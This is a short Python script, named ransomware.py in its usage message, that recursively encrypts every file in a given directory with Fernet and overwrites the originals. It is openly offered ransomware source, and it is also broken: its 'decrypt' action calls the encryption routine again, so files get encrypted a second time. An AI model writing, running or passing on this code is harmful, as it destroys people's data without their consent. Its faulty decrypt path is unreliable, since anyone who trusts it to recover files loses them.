import os
import sys
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

def encrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 ransomware.py <encrypt/decrypt> <directory>")
        sys.exit()

    action = sys.argv[1]
    directory = sys.argv[2]

    if action == "encrypt":
        key = generate_key()
        print(f"Encryption Key: {key.decode()}")
        encrypt_files(directory, key)
        print("All files have been encrypted.")
        
    elif action == "decrypt":
        key = load_key()
        encrypt_files(directory, key)
        print("All files have been decrypted.")
    else:
        print("Invalid action. Use 'encrypt' or 'decrypt'.")

if __name__ == "__main__":
    main()
